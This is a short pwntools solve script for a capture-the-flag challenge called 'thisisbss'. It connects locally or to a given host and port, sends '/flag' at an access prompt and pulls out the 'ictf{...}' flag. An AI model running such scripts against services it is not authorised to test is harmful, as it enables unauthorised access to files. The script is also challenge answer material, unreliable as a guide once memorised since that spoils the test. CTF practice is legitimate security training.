import argparse
import re
from pwn import *

# context.log_level = 'debug'

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    # --remote <host> <port>
    parser.add_argument('--remote', nargs=2, metavar=('host', 'port'), required=False)
    parser.add_argument('--local', action='store_true', required=False)
    args = parser.parse_args()

    assert args.remote or args.local, 'Must specify either --remote or --local'

    if args.local:
        # Local run assumes you're in a directory with the built binary.
        r = process(['./thisisbss'])
    else:
        r = remote(args.remote[0], args.remote[1])

    r.recvuntil(b" access:")
    r.sendline(b"/flag")

    # find ictf{...} in flag with regex
    flag = re.search(b'ictf{.*}', r.recvall()).group(0)
    print(f"Got the flag: {flag.decode()}")

    # r.interactive()